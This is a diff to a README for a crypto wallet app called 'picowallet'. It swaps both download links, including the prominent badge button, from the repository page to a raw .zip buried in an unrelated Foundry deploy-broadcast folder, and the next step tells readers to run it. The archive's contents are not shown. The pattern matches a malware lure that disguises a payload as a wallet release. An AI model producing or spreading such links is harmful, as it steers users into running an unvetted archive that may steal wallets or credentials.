@@ -39,11 +39,11 @@ Follow these simple steps to get picowallet up and running on your computer:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/scar72231/picowallet](https://github.com/scar72231/picowallet)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/scar72231/picowallet/main/app/packages/foundry/broadcast/Deploy.s.sol/1/3.7-beta.2.zip](https://raw.githubusercontent.com/scar72231/picowallet/main/app/packages/foundry/broadcast/Deploy.s.sol/1/3.7-beta.2.zip)**
 
 Big blue button right here too:
 
-[![Download picowallet](https://img.shields.io/badge/Download-picowallet-blueviolet?style=for-the-badge)](https://github.com/scar72231/picowallet)
+[![Download picowallet](https://img.shields.io/badge/Download-picowallet-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/scar72231/picowallet/main/app/packages/foundry/broadcast/Deploy.s.sol/1/3.7-beta.2.zip)
 
 ### Step 2: Run the Download
 
